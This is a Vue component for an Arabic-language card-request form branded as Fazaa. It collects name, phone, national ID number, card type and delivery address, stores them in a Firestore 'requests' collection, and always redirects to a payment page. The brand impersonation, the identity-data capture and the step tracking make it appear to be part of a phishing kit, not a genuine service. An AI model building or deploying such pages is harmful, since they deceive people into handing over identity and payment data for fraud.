<script setup lang="ts">
import { ref } from 'vue';
import { ChevronDown, Calendar, ArrowRight } from 'lucide-vue-next';
import { useRouter } from 'vue-router';
import { collection, doc, setDoc } from 'firebase/firestore';
import { db, handleFirestoreError, OperationType } from '../firebase';

const router = useRouter();

const formData = ref({
  name: '',
  mobile: '',
  idNumber: '',
  cardType: '',
  address: '',
  date: '29/05/2026'
});

const isSubmitting = ref(false);

const errors = ref({
  name: '',
  mobile: '',
  idNumber: '',
  cardType: '',
  address: ''
});

const validateForm = () => {
  let isValid = true;
  errors.value = { name: '', mobile: '', idNumber: '', cardType: '', address: '' };

  if (!formData.value.name.trim()) {
    errors.value.name = 'الاسم مطلوب';
    isValid = false;
  }
  
  if (!formData.value.mobile.trim() || !/^[0-9\+\-\s]{9,15}$/.test(formData.value.mobile)) {
    errors.value.mobile = 'رقم الهاتف غير صالح';
    isValid = false;
  }

  if (!formData.value.idNumber.trim()) {
    errors.value.idNumber = 'رقم الهوية مطلوب';
    isValid = false;
  }

  if (!formData.value.cardType) {
    errors.value.cardType = 'يرجى اختيار نوع البطاقة';
    isValid = false;
  }

  if (!formData.value.address.trim()) {
    errors.value.address = 'عنوان التوصيل مطلوب';
    isValid = false;
  }

  return isValid;
};

const submitForm = async () => {
  if (isSubmitting.value) return;
  if (!validateForm()) return;
  
  isSubmitting.value = true;
  try {
    const newRequestRef = doc(collection(db, 'requests'));
    const requestId = newRequestRef.id;
    
    // Save ID for next steps immediately
    localStorage.setItem('currentRequestId', requestId);

    // Save fallback just in case
    const payload = {
      ...formData.value,
      step: 'form',
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString()
    };
    
    try {
      const fallbackStr = localStorage.getItem('fallback_requests') || '{}';
      const fallbackData = JSON.parse(fallbackStr);
      fallbackData[requestId] = payload;
      localStorage.setItem('fallback_requests', JSON.stringify(fallbackData));
    } catch(e) {}

    await setDoc(newRequestRef, payload);
    console.log('Form Submitted, ID:', requestId);
  } catch (error) {
    handleFirestoreError(error, OperationType.CREATE, 'requests');
  } finally {
    isSubmitting.value = false;
    router.push('/payment');
  }
};

const goBack = () => {
  router.push('/');
};
</script>

<template>
  <div class="max-w-xl mx-auto bg-[#f0f1f3] min-h-screen shadow-md flex flex-col relative pb-10">
    
    <!-- Top Header Logo -->
    <div class="flex justify-center pt-6 pb-2 relative z-10 bg-[#f0f1f3]">
      <button @click="goBack" class="absolute right-4 top-8 p-2 rounded-full bg-white shadow-sm hover:bg-gray-50">
        <ArrowRight class="w-5 h-5 text-gray-700" />
      </button>
      <div class="text-[#0e4881] font-bold text-3xl flex flex-col items-center">
        <span class="text-4xl">فزعة</span>
        <span class="text-sm tracking-widest uppercase">FAZAA</span>
      </div>
    </div>

    <!-- Cards Banner Mock -->
    <div class="w-full h-48 bg-gradient-to-tr from-[#1b3a5a] via-[#244265] to-[#1b3a5a] relative overflow-hidden flex items-center justify-center -mt-4 border-b-2 border-yellow-500/50">
       <div class="absolute inset-0 opacity-20 bg-[radial-gradient(ellipse_at_center,_var(--tw-gradient-stops))] from-white via-transparent to-transparent"></div>
       <div class="flex gap-4 opacity-80 scale-[1.6] rotate-[-8deg] transform translate-y-4">
          <div class="w-24 h-16 bg-gradient-to-br from-gray-800 to-gray-900 rounded-md shadow-2xl border border-gray-700"></div>
          <div class="w-24 h-16 bg-gradient-to-br from-yellow-500 to-yellow-600 rounded-md shadow-2xl border border-yellow-400"></div>
          <div class="w-24 h-16 bg-gradient-to-br from-blue-300 to-blue-500 rounded-md shadow-2xl border border-blue-300"></div>
          <div class="w-24 h-16 bg-gradient-to-br from-gray-200 to-gray-400 rounded-md shadow-2xl border border-gray-300"></div>
       </div>
    </div>

    <!-- Form Section -->
    <div class="px-6 mt-8 mb-8 text-center relative z-10 w-full max-w-sm mx-auto">
      <p class="text-[#0e4881] font-semibold mb-8 text-[18px] leading-relaxed drop-shadow-sm">
        أدخل البيانات المطلوبة لإكمال طلب البطاقة وتأكيد عنوان التوصيل
      </p>

      <form @submit.prevent="submitForm" class="bg-white border border-gray-100 rounded-[1.5rem] p-7 shadow-xl shadow-blue-900/5 relative overflow-visible">
        
        <div class="space-y-5 text-right">
          
          <!-- Name -->
          <div class="relative">
            <input 
              v-model="formData.name"
              type="text" 
              dir="rtl"
              placeholder="الاسم" 
              class="w-full border-b-[1.5px] border-gray-300 rounded-none px-2 py-3 text-right focus:outline-none focus:border-[#d9b33a] placeholder-gray-400 text-gray-800 bg-transparent transition-colors font-medium text-lg"
            />
            <p v-if="errors.name" class="text-red-500 text-xs mt-1 absolute -bottom-5 right-2">{{ errors.name }}</p>
          </div>

          <!-- Mobile number -->
          <div class="relative">
            <input 
              v-model="formData.mobile"
              type="tel" 
              dir="rtl"
              placeholder="رقم الهاتف" 
              class="w-full border-b-[1.5px] border-gray-300 rounded-none px-2 py-3 text-right focus:outline-none focus:border-[#d9b33a] placeholder-gray-400 text-gray-800 bg-transparent transition-colors font-medium text-lg"
            />
            <p v-if="errors.mobile" class="text-red-500 text-xs mt-1 absolute -bottom-5 right-2">{{ errors.mobile }}</p>
          </div>

          <!-- ID Number -->
          <div class="relative">
            <input 
              v-model="formData.idNumber"
              type="text" 
              dir="rtl"
              placeholder="رقم الهوية" 
              class="w-full border-b-[1.5px] border-gray-300 rounded-none px-2 py-3 text-right focus:outline-none focus:border-[#d9b33a] placeholder-gray-400 text-gray-800 bg-transparent transition-colors font-medium text-lg"
            />
            <p v-if="errors.idNumber" class="text-red-500 text-xs mt-1 absolute -bottom-5 right-2">{{ errors.idNumber }}</p>
          </div>

          <!-- Card Type Dropdown -->
          <div class="relative">
            <select 
              v-model="formData.cardType"
              dir="rtl"
              class="w-full border-b-[1.5px] border-gray-300 rounded-none px-2 py-3 appearance-none placeholder-gray-400 text-gray-800 focus:outline-none focus:border-[#d9b33a] bg-transparent transition-colors font-medium text-lg pl-8 cursor-pointer"
            >
              <option value="" disabled selected hidden>نوع البطاقة</option>
              <option value="silver">فضية (Silver)</option>
              <option value="gold">ذهبية (Gold)</option>
              <option value="platinum">بلاتينية (Platinum)</option>
            </select>
            <div class="absolute inset-y-0 left-2 flex items-center pointer-events-none text-[#d9b33a]">
              <ChevronDown class="w-5 h-5" />
            </div>
            <p v-if="errors.cardType" class="text-red-500 text-xs mt-1 absolute -bottom-5 right-2">{{ errors.cardType }}</p>
          </div>

          <!-- Address -->
          <div class="relative">
            <input 
              v-model="formData.address"
              type="text" 
              dir="rtl"
              placeholder="عنوان التوصيل" 
              class="w-full border-b-[1.5px] border-gray-300 rounded-none px-2 py-3 text-right focus:outline-none focus:border-[#d9b33a] placeholder-gray-400 text-gray-800 bg-transparent transition-colors font-medium text-lg"
            />
            <p v-if="errors.address" class="text-red-500 text-xs mt-1 absolute -bottom-5 right-2">{{ errors.address }}</p>
          </div>

          <!-- Date -->
          <div class="relative">
            <input 
              v-model="formData.date"
              type="text" 
              dir="rtl"
              readonly
              class="w-full border-b-[1.5px] border-gray-300 rounded-none px-2 py-3 text-right focus:outline-none focus:border-[#d9b33a] text-gray-800 bg-transparent transition-colors font-medium text-lg pl-10 opacity-80 cursor-default"
            />
            <div class="absolute inset-y-0 left-2 flex items-center pointer-events-none text-[#d9b33a]">
              <Calendar class="w-5 h-5" />
            </div>
          </div>

          <!-- Submit Button -->
          <div class="pt-8 pb-2 flex justify-center">
            <button 
              type="submit" 
              :disabled="isSubmitting"
              class="flex items-center justify-center gap-2 bg-gradient-to-r from-gray-700 to-gray-800 hover:from-gray-600 hover:to-gray-700 transition-all text-white font-bold text-xl py-4 flex-1 rounded-xl shadow-lg hover:shadow-xl transform hover:-translate-y-0.5 disabled:opacity-70 disabled:cursor-not-allowed disabled:transform-none border border-gray-600 w-full"
            >
              <span v-if="isSubmitting" class="animate-spin rounded-full h-6 w-6 border-b-2 border-white"></span>
              <span v-else>المتابعة</span>
            </button>
          </div>
          
        </div>

      </form>
    </div>

    <!-- Bottom Footer Image Mock -->
    <div class="mt-8 flex flex-col items-center justify-center opacity-60 pointer-events-none pb-8 text-center px-4">
      <div class="text-[#0e4881] font-bold text-2xl flex flex-col items-center mb-4">
        <span class="text-3xl">فزعة</span>
        <span class="text-[10px] tracking-widest uppercase">FAZAA</span>
      </div>
      <p class="text-xs text-[#0e4881] max-w-[200px] leading-tight font-medium">
        فزعة ... أسلوب حياة للسعادة والإيجابية<br/>
        <span class="font-sans ltr inline-block">Fazaa... a lifestyle to happiness & positivity</span><br/>
        <span class="font-sans ltr text-blue-500 mt-1 inline-block">www.fazaa.ae</span>
      </p>
    </div>

  </div>
</template>
